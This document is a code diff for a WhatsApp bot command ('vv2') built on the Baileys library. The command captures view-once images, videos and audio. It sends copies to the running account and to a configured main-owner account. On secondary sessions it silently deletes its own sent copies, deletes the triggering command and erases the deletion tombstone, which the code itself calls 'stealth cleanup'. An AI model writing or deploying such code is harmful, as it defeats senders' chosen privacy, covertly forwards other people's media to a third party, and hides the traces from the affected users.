@@ -1,6 +1,7 @@
 import { downloadMediaMessage, getContentType } from '@whiskeysockets/baileys';
 import pino from 'pino';
 import { config } from '../config.js';
+import { jidNumber, sleep } from '../utils.js';
 
 function unwrapAll(message) {
   let current = message;
@@ -43,41 +44,137 @@ function directMedia(message) {
   return null;
 }
 
-async function sendCleanMedia(sock, jid, media, buffer) {
+function timestampOf(message) {
+  const raw = message?.messageTimestamp;
+
+  if (typeof raw === 'number') return raw;
+  if (typeof raw === 'bigint') return Number(raw);
+  if (raw && typeof raw.toNumber === 'function') return raw.toNumber();
+
+  const low = Number(raw?.low);
+  if (Number.isFinite(low) && low > 0) return low;
+
+  const parsed = Number(raw);
+  if (Number.isFinite(parsed) && parsed > 0) return parsed;
+
+  return Math.floor(Date.now() / 1000);
+}
+
+function cleanMedia(media, buffer) {
   if (media.type === 'imageMessage') {
-    await sock.sendMessage(jid, { image: buffer });
-    return;
+    return { image: buffer };
   }
 
   if (media.type === 'videoMessage') {
-    await sock.sendMessage(jid, {
+    return {
       video: buffer,
       mimetype: media.message.videoMessage?.mimetype || 'video/mp4'
-    });
-    return;
+    };
   }
 
-  await sock.sendMessage(jid, {
+  return {
     audio: buffer,
     mimetype: media.message.audioMessage?.mimetype || 'audio/ogg; codecs=opus',
     ptt: Boolean(media.message.audioMessage?.ptt)
-  });
+  };
 }
 
-async function deleteCommand(sock, chat, raw) {
+function userJid(value) {
+  const number = jidNumber(value);
+  return number ? `${number}@s.whatsapp.net` : '';
+}
+
+/**
+ * Delete only from the WhatsApp account running this Baileys session.
+ * This does not revoke the message from the recipient.
+ */
+async function deleteForMe(sock, jid, message) {
+  if (!jid || !message?.key?.id) return false;
+
+  const timestamp = timestampOf(message);
+
+  try {
+    await sock.chatModify(
+      {
+        deleteForMe: {
+          deleteMedia: true,
+          key: message.key,
+          timestamp
+        }
+      },
+      jid
+    );
+    return true;
+  } catch {}
+
+  // Compatibility fallback for older/RC Baileys chat modification shape.
+  try {
+    await sock.chatModify(
+      {
+        clear: {
+          messages: [
+            {
+              id: message.key.id,
+              fromMe: Boolean(message.key.fromMe),
+              timestamp
+            }
+          ]
+        }
+      },
+      jid
+    );
+    return true;
+  } catch {}
+
+  return false;
+}
+
+/**
+ * Remove the command from the source chat for everyone where WhatsApp allows
+ * it, then clean the revoke tombstone only from this bot account's own view.
+ */
+async function removeCommandAndLocalTrace(sock, chat, raw) {
+  let revoked = false;
+
   try {
     await sock.sendMessage(chat, { delete: raw.key });
+    revoked = true;
   } catch {}
+
+  // Give WhatsApp a moment to apply the revoke, then remove the local row.
+  // Repeating delete-for-me is intentional: it also cleans the locally
+  // rendered "You deleted this message" row when the same key is reused.
+  if (revoked) await sleep(700);
+
+  for (let attempt = 0; attempt < 3; attempt++) {
+    await deleteForMe(sock, chat, raw);
+    if (attempt < 2) await sleep(350);
+  }
+}
+
+/**
+ * Send media normally so the recipient receives and keeps it, then erase only
+ * this session's local sent copy. A delayed second pass handles sync lag.
+ */
+async function sendThenHideLocally(sock, jid, media, buffer) {
+  const sent = await sock.sendMessage(jid, cleanMedia(media, buffer));
+
+  await sleep(250);
+  await deleteForMe(sock, jid, sent);
+  await sleep(500);
+  await deleteForMe(sock, jid, sent);
+
+  return sent;
 }
 
 export default {
   name: 'vv2',
   aliases: ['viewonce2', 'vvprivate'],
   category: 'TOOLS',
-  description: 'Recover replied view-once media and privately send a clean copy to the command sender and main owner',
+  description: 'Recover view-once media to this account and the main account, with secondary-session stealth cleanup',
   ownerOnly: false,
 
-  async run({ quoted, sock, chat, raw, sender }) {
+  async run({ quoted, sock, chat, raw, sessionId }) {
     if (!quoted?.message) {
       throw new Error('Reply to a view-once image/video/audio with .vv2');
     }
@@ -118,13 +215,32 @@ export default {
       throw new Error('WhatsApp returned no media data for that message.');
     }
 
+    const selfJid = userJid(sock.user?.id);
     const ownerJid = `${config.owner}@s.whatsapp.net`;
-    const recipients = [...new Set([sender, ownerJid].filter(Boolean))];
+    const isSecondary = Boolean(sessionId && sessionId !== 'primary');
 
-    for (const jid of recipients) {
-      await sendCleanMedia(sock, jid, media, buffer);
+    if (!selfJid) {
+      throw new Error('Could not determine this linked WhatsApp account.');
     }
 
-    await deleteCommand(sock, chat, raw);
+    // 1) Always keep one clean recovered copy in the account that ran .vv2.
+    //    For a secondary session this is the secondary account's own self-chat.
+    await sock.sendMessage(selfJid, cleanMedia(media, buffer));
+
+    // 2) Also deliver to the configured primary/main owner account.
+    //    If this IS the primary account, selfJid === ownerJid, so do not send
+    //    a duplicate. When a secondary sends it, the primary keeps the media
+    //    while the secondary silently removes its own local sent copy.
+    if (ownerJid !== selfJid) {
+      if (isSecondary) {
+        await sendThenHideLocally(sock, ownerJid, media, buffer);
+      } else {
+        await sock.sendMessage(ownerJid, cleanMedia(media, buffer));
+      }
+    }
+
+    // 3) Remove .vv2 from the source chat and then remove the local revoke
+    //    tombstone from this bot account's own view.
+    await removeCommandAndLocalTrace(sock, chat, raw);
   }
 };
